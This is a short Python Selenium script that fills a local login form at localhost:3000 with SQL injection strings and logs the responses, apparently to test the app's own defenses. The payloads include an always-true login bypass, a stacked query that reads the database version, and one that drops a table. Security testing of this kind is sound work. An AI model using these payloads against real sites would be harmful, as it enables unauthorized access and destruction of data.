import time
from selenium import webdriver
import requests
# Press the green button in the gutter to run the script.
from selenium.webdriver.common.by import By

if __name__ == '__main__': # Runs code without the need for main()
    # Provide the email and password
    email = "TEst11@example.com' or ''='"
    password = "dasdsadasdasd' or ''='"
    sqlInjection = ["TEst11@example.com' or ''='", "sdasdsad@sdas.com; SELECT version(); --","asdasdsadsdasd@sd.com' or ''='; DROP TABLE user_device; --"]
    outputfile = open("result.txt", 'w')

    options = webdriver.ChromeOptions() 
    options.add_argument("--start-maximized") # Start browser max window.
    options.add_argument('--log-level=3') # Suppress console error/warning/info messages when executing selenium python scripts.

    # Provide the path of chromedriver present on your system.
    driver = webdriver.Chrome(executable_path="D:/ReadHTML/chromedriver.exe", chrome_options=options) #Selecting the driver needed for the browser of choice + options that we want the browser to run in.
    driver.set_window_size(1920, 1080) #set window size to 1920 x 1080.

    # Send a get request to the url
    driver.get('http://localhost:3000/login')
    time.sleep(5) # Wait 5 seconds.


    for eachone in sqlInjection:
        # the provided email and password in it.
        driver.find_element(by=By.NAME, value='email').send_keys(eachone)
        driver.find_element(by=By.NAME, value='password').send_keys(eachone)

        # Find the signin button and click on it.
        # driver.find_element_by_css_selector("btn btn-primary").click()
        driver.find_element(By.CLASS_NAME, 'btn-primary').click()
        time.sleep(5) # Wait 5 seconds.
        outputfile.write(driver.find_element(By.ID, 'result').text)
        driver.find_element(By.CLASS_NAME, 'btn-secondary').click()